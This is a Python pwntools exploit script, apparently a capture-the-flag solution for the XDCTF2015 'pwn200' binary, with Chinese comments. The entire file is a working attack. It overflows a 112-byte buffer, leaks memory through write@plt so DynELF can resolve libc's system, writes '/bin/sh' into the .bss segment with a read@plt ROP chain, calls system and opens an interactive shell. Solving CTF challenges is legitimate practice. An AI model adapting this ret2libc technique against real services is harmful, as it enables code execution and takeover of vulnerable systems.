#!usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *
import pwnlib
context(os='linux', log_level='debug')
p = process("./pwn200")
elf = ELF("./pwn200")
writeplt = elf.symbols['write']
readplt = elf.symbols['read']
main_address =0x080484BE      #调用main函数
bss_address =0x0804a020    #bss段,用来写入“/bin/sh\0”
def leak(address):
  payload = "A" * 112
  payload += p32(writeplt)
  payload += p32(main_address)
  payload += p32(1)
  payload += p32(address)
  payload += p32(4)
  p.send(payload)
  data= p.recvuntil("XDCTF2015~!\n")
  data=data.split('Welcome')[0]
  print "%#x => %s" % (address, (data or '').encode('hex'))
  return data


p.recvline()
dynelf = DynELF(leak, elf=ELF("./pwn200"))
systemAddress = dynelf.lookup("system", "libc") 
print "systemAddress:=====", hex(systemAddress)


ppprAddress = 0x0804856c  #连续3次pop的ROP
payload1 = "A" * 112
payload1 += p32(readplt)
payload1 += p32(ppprAddress)
payload1 += p32(0)
payload1 += p32(bss_address)
payload1 += p32(8)
payload1 += p32(systemAddress) + p32(main_address) + p32(bss_address)

p.send(payload1)
p.send('/bin/sh\x00')

p.interactive()


